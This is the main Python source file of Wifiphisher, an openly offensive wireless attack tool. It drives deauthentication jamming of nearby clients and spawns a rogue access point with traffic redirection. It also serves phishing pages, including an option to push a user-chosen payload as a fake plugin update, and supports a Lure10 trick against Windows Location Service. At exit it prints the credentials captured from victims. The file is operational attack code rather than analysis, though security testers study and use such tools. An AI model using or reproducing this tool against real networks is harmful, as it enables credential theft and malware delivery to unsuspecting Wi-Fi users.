#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: skip-file
import subprocess
import os
import logging
import logging.config
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
import signal
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from wifiphisher.common.constants import *
import wifiphisher.common.extensions as extensions
import wifiphisher.common.recon as recon
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.tui as tui
import wifiphisher.extensions.handshakeverify as handshakeverify


logger = logging.getLogger(__name__)

# Fixes UnicodeDecodeError for ESSIDs
reload(sys)
sys.setdefaultencoding('utf8')


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " +
              "Example: -jI wlan1"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Manually choose an interface that supports AP mode for  " +
              "spawning an AP. " +
              "Example: -aI wlan0"
              )
    )
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" +
              "Example: -iI ppp0"
              )
    )
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("Skip the deauthentication phase. When this option is used, " +
              "only one wireless interface is required"
              ),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"
              )
    )
    parser.add_argument(
        "-dE",
        "--deauth-essid",
        help=("Deauth all the BSSIDs having same ESSID from AP selection or " +
              "the ESSID given by -e option"
              ),
        action='store_true')
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-hC",
        "--handshake-capture",
        help=("Capture of the WPA/WPA2 handshakes for verifying passphrase" +
              "Example : -hC capture.pcap"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')
    parser.add_argument(
        "-lC",
        "--lure10-capture",
        help=("Capture the BSSIDs of the APs that are discovered during "
              "AP selection phase. This option is part of Lure10 attack."),
        action='store_true')
    parser.add_argument(
        "-lE",
        "--lure10-exploit",
        help=("Fool the Windows Location Service of nearby Windows users "
              "to believe it is within an area that was previously captured "
              "with --lure10-capture. Part of the Lure10 attack."))
    parser.add_argument(
        "-iAM",
        "--mac-ap-interface",
        help=("Specify the MAC address of the AP interface"))
    parser.add_argument(
        "-iDM",
        "--mac-deauth-interface",
        help=("Specify the MAC address of the jamming interface"))
    parser.add_argument(
        "-iNM",
        "--no-mac-randomization",
        help=("Do not change any MAC address"), action='store_true')
    parser.add_argument(
        "--log-file",
        help=("Log activity to file"),
        action="store_true")

    return parser.parse_args()


VERSION = "1.3GIT"
args = parse_args()
APs = {}  # for listing APs


def setup_logging(args):
    """
    Setup the logging configurations
    """
    root_logger = logging.getLogger()
    # logging setup
    if args.log_file:
        logging.config.dictConfig(LOGGING_CONFIG)
        should_roll_over = False
        # use root logger to rotate the log file
        if os.path.getsize(LOG_FILEPATH) > 0:
            should_roll_over = os.path.isfile(LOG_FILEPATH)
        should_roll_over and root_logger.handlers[0].doRollover()
        logger.info("Starting Wifiphisher")


def check_args(args):
    """
    Checks the given arguments for logic errors.
    """

    if args.presharedkey and \
        (len(args.presharedkey) < 8 or
            len(args.presharedkey) > 64):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] Pre-shared key must be between 8 and 63 printable characters.')

    if args.handshake_capture and not os.path.isfile(
            args.handshake_capture):
        sys.exit('[' +
                 R +
                 '-' +
                 W +
                 '] handshake capture does not exist.')
    elif args.handshake_capture and not handshakeverify.\
            is_valid_handshake_capture(args.handshake_capture):
        sys.exit('[' +
                 R +
                 '-' +
                 W +
                 '] handshake capture does not contain valid handshake')

    if ((args.jamminginterface and not args.apinterface) or
            (not args.jamminginterface and args.apinterface)) and \
            not (args.nojamming and args.apinterface):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')

    if args.nojamming and args.jamminginterface:
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')

    if args.lure10_exploit and args.nojamming:
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')

    if args.lure10_exploit and not os.path.isfile(
            LOCS_DIR + args.lure10_exploit):
        sys.exit('[' +
                 R +
                 '-' +
                 W +
                 '] Lure10 capture does not exist. Listing directory of captures: ' +
                 str(os.listdir(LOCS_DIR)))

    if (args.mac_ap_interface and args.no_mac_randomization) or \
            (args.mac_deauth_interface and args.no_mac_randomization):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --no-mac-randomization (-iNM) cannot work together with --mac-ap-interface or '
            '--mac-deauth-interface (-iDM)')


def set_ip_fwd():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        stdout=DN,
        stderr=PIPE
    )


def set_route_localnet():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

def kill_interfering_procs():
    """
    Kill the interfering processes that may interfere the wireless card
    :return None
    :rtype None
    ..note: The interfering processes are referenced by airmon-zc.
    """

    # stop the NetworkManager related services
    # incase service is not installed catch OSError
    try:
        subprocess.Popen(['service', 'network-manager', 'stop'],
                         stdout=subprocess.PIPE,
                         stderr=DN)
        subprocess.Popen(['service', 'NetworkManager', 'stop'],
                         stdout=subprocess.PIPE,
                         stderr=DN)
        subprocess.Popen(['service', 'avahi-daemon', 'stop'],
                         stdout=subprocess.PIPE,
                         stderr=DN)
    except OSError:
        pass

    # Kill any possible programs that may interfere with the wireless card
    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    # total processes in the system
    sys_procs = output.splitlines()
    # loop each interfering processes and find if it is running
    for interfering_proc in INTERFERING_PROCS:
        for proc in sys_procs:
            # kill all the processes name equal to interfering_proc
            if interfering_proc in proc:
                pid = int(proc.split(None, 1)[0])
                print '[' + G + '+' + W + "] Sending SIGKILL to " +\
                    interfering_proc
                os.kill(pid, signal.SIGKILL)


class WifiphisherEngine:

    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()
        self.em = extensions.ExtensionManager(self.network_manager)
        self.op_mode = 0x0

    def set_op_mode(self, args):
        """
        Sets the operation mode.

        An operation mode resembles how the tool will best leverage
        the given resources.

        Modes of operation
        1) Advanced 0x1
          2 cards, 2 interfaces
          i) AP, ii) EM
        2) Advanced and Internet 0x2
          3 cards, 3 interfaces
          i) AP, ii) EM iii) Internet
        3) AP-only and Internet 0x3
          2 cards, 2 interfaces
          i) AP, ii) Internet
        4) AP-only 0x4
          1 card, 1 interface
          i) AP
        5) Advanced w/ 1 vif support AP/Monitor 0x5
          1 card, 2 interfaces
          i) AP, ii) Extensions
        6) Advanced and Internet w/ 1 vif support AP/Monitor 0x6
          2 cards, 3 interfaces
          i) AP, ii) Extensions, iii) Internet
        """

        card, is_single_perfect_card = interfaces.is_add_vif_required(args)
        if not args.internetinterface and not args.nojamming:
            if not is_single_perfect_card:
                self.op_mode = OP_MODE1
            else:
                if card is not None:
                    self.network_manager.add_virtual_interface(card)
                self.op_mode = OP_MODE5
        if args.internetinterface and not args.nojamming:
            if not is_single_perfect_card:
                self.op_mode = OP_MODE2
            else:
                if card is not None:
                    self.network_manager.add_virtual_interface(card)
                self.op_mode = OP_MODE6
        if args.internetinterface and args.nojamming:
            self.op_mode = OP_MODE3
        if args.nojamming and not args.internetinterface:
            self.op_mode = OP_MODE4

    def internet_sharing_enabled(self):
        """
        Returns True if we are operating in a mode
        that shares Internet access.
        """

        return self.op_mode in [OP_MODE2, OP_MODE3]

    def advanced_enabled(self):
        """
        Returns True if we are operating in an advanced
        mode (a mode that leverages two network cards)
        """

        return self.op_mode in [OP_MODE1, OP_MODE2, OP_MODE5, OP_MODE6]

    def deauth_enabled(self):
        """
        Returns True if we are operating in a mode
        that deauth is enabled.
        """

        return self.op_mode in [OP_MODE1, OP_MODE2, OP_MODE5, OP_MODE6]

    def freq_hopping_enabled(self):
        """
        Returns True if we are separating the wireless cards
        for jamming and lunching AP.
        ..note: MODE5 and MODE6 only use one card to do deauth and
        lunch ap so it is not allowed to do frequency hopping.
        """

        return self.op_mode in [OP_MODE1, OP_MODE2]

    def stop(self):
        if DEV:
            print "[" + G + "+" + W + "] Show your support!"
            print "[" + G + "+" + W + "] Follow us: https://twitter.com/wifiphisher"
            print "[" + G + "+" + W + "] Like us: https://www.facebook.com/Wifiphisher"
        print "[" + G + "+" + W + "] Captured credentials:"
        for cred in phishinghttp.creds:
            logger.info("Creds: %s", cred)
            print cred

        # EM depends on Network Manager.
        # It has to shutdown first.
        self.em.on_exit()
        # move the access_points.on_exit before the exit for
        # network manager
        self.access_point.on_exit()
        self.network_manager.on_exit()
        self.template_manager.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')

        print '[' + R + '!' + W + '] Closing'
        sys.exit(0)

    def start(self):

        # Parse args
        global args, APs
        args = parse_args()

        # setup the logging configuration
        setup_logging(args)

        # Check args
        check_args(args)

        # Set operation mode
        self.set_op_mode(args)

        # Are you root?
        if os.geteuid():
            logger.error("Non root user detected")
            sys.exit('[' + R + '-' + W + '] Please run as root')

        self.network_manager.start()

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if self.internet_sharing_enabled():
                self.network_manager.internet_access_enable = True
                if self.network_manager.is_interface_valid(
                        args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    if interfaces.is_wireless_interface(
                            internet_interface):
                        self.network_manager.unblock_interface(internet_interface)
                logger.info("Selecting %s interface for accessing internet",
                            args.internetinterface)
            if self.advanced_enabled():
                if args.jamminginterface and args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.jamminginterface, "monitor"):
                        mon_iface = args.jamminginterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                # display selected interfaces to the user
                logger.info("Selecting {} for deauthentication and {} for rouge access point"
                            .format(mon_iface, ap_iface))
                print (
                    "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                    "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                    "rogue Access Point").format(
                    G, W, mon_iface, ap_iface)

                # randomize the mac addresses
                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(
                            ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)
                    if args.mac_deauth_interface:
                        self.network_manager.set_interface_mac(
                            mon_iface, args.mac_deauth_interface)
                    else:
                        self.network_manager.set_interface_mac_random(
                            mon_iface)
            if not self.deauth_enabled():
                if args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(
                            ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)

                print (
                    "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                    "rogue Access Point").format(
                    G, W, ap_iface)
                logger.info("Selecting {} interface for rouge access point"
                            .format(ap_iface))
                # randomize the mac addresses
                if not args.no_mac_randomization:
                    self.network_manager.set_interface_mac_random(ap_iface)

            # make sure interfaces are not blocked
            logger.info("Unblocking interfaces")
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            # set monitor mode only when --essid is not given
            if self.advanced_enabled() or args.essid is None:
                self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError,
                interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            logger.exception("The following error has occurred:")
            print ("[{0}!{1}] {2}").format(R, W, err)

            time.sleep(1)
            self.stop()

        if not args.internetinterface:
            kill_interfering_procs()
            logger.info("Killing all interfering processes")

        rogue_ap_mac = self.network_manager.get_interface_mac(ap_iface)
        if not args.no_mac_randomization:
            logger.info("Changing {} MAC address to {}".format(ap_iface, rogue_ap_mac))
            print "[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(G, W, ap_iface, rogue_ap_mac)
            if self.advanced_enabled():
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                logger.info("Changing {} MAC address to {}".format(mon_iface, mon_mac))
                print ("[{0}+{1}] Changing {2} MAC addr to {3}".format(G, W, mon_iface, mon_mac))

        if self.internet_sharing_enabled():
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            # We don't have target attacking MAC in frenzy mode
            # That is we deauth all the BSSIDs that being sniffed
            target_ap_mac = None
            enctype = None
        else:
            # let user choose access point
            # start the monitor adapter
            self.network_manager.up_interface(mon_iface)
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher,
                                           self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info,
                                          ap_info_object)
            # if the user has chosen a access point continue
            # otherwise shutdown
            if access_point:
                # store choosen access point's information
                essid = access_point.get_name()
                channel = access_point.get_channel()
                target_ap_mac = access_point.get_mac_address()
                enctype = access_point.get_encryption()
            else:
                self.stop()
        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        tui_template_obj = tui.TuiTemplateSelection()
        template = tui_template_obj.gather_info(args.phishingscenario, self.template_manager)
        logger.info("Selecting {} template".format(template.get_display_name()))
        print ("[" + G + "+" + W + "] Selecting " +
               template.get_display_name() + " template")

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = False
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input(
                    "[" +
                    G +
                    "+" +
                    W +
                    "] Enter the [" +
                    G +
                    "full path" +
                    W +
                    "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print '[' + R + '-' + W + '] Invalid file path!'
            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
            template.update_payload_path(os.path.basename(payload_path))
            copyfile(payload_path, PHISHING_PAGES_DIR +
                     template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if target_ap_mac is not None:
            ap_logo_path = template.use_file(
                self.mac_matcher.get_vendor_logo_path(target_ap_mac))

        template.merge_context({
            'target_ap_channel': channel or "",
            'target_ap_essid': essid or "",
            'target_ap_bssid': target_ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': self.mac_matcher.get_vendor_name(target_ap_mac) or "",
            'target_ap_logo_path': ap_logo_path or ""
        })

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --nojamming is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.network_manager.up_interface(ap_iface)
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if self.internet_sharing_enabled():
            self.access_point.set_internet_interface(args.internetinterface)
        print '[' + T + '*' + W + '] Starting the fake access point...'
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except BaseException:
            self.stop()
        # If are on Advanced mode, start Extension Manager (EM)
        # We need to start EM before we boot the web server
        if self.advanced_enabled():
            shared_data = {
                'is_freq_hop_allowed': self.freq_hopping_enabled(),
                'target_ap_channel': channel or "",
                'target_ap_essid': essid or "",
                'target_ap_bssid': target_ap_mac or "",
                'target_ap_encryption': enctype or "",
                'target_ap_logo_path': ap_logo_path or "",
                'rogue_ap_mac': rogue_ap_mac,
                'APs': APs_context,
                'args': args
            }

            self.network_manager.up_interface(mon_iface)
            self.em.set_interface(mon_iface)
            extensions = DEFAULT_EXTENSIONS
            if args.lure10_exploit:
                extensions.append(LURE10_EXTENSION)
            if args.handshake_capture:
                extensions.append(HANDSHAKE_VALIDATE_EXTENSION)
            self.em.set_extensions(extensions)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()
        # With configured DHCP, we may now start the web server
        if not self.internet_sharing_enabled():
            # Start HTTP server in a background thread
            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
            webserver = Thread(target=phishinghttp.runHTTPServer,
                               args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        clients_APs = []
        APs = []

        # Main loop.
        try:
            main_info = tui.MainInfo(VERSION, essid, channel, ap_iface,
                                     self.em, phishinghttp,
                                     args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
            self.stop()
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        print ('[' + T + '*' + W + '] Starting Wifiphisher %s ( %s ) at %s' %
               (VERSION, WEBSITE, time.strftime("%Y-%m-%d %H:%M")))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
